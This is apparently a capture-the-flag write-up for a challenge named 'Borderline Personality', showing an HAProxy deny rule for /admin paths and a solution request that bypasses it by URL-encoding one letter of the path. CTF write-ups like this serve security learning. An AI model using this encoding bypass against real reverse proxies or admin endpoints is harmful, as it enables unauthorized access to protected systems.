#### Borderline Personality
- points earned: 50
#### Where's the flag?
- The flag is hard coded into the app
- It gets returned in the response for the `/admin/flag` route
#### Notes / Intuition
- haproxy rules prevent access to the `/admin` route
	```bash
	acl restricted_path path -m reg ^/+admin
	http-request deny if restricted_path
	```
- Testing standard bypass techniques I was able to discover that url encoding allows bypass of the haproxy rule.

#### Solution
- send the request below to the server
	```http
	GET /%61dmin/flag HTTP/1.1
	Host: chall.ehax.in:9098
	
	
	```

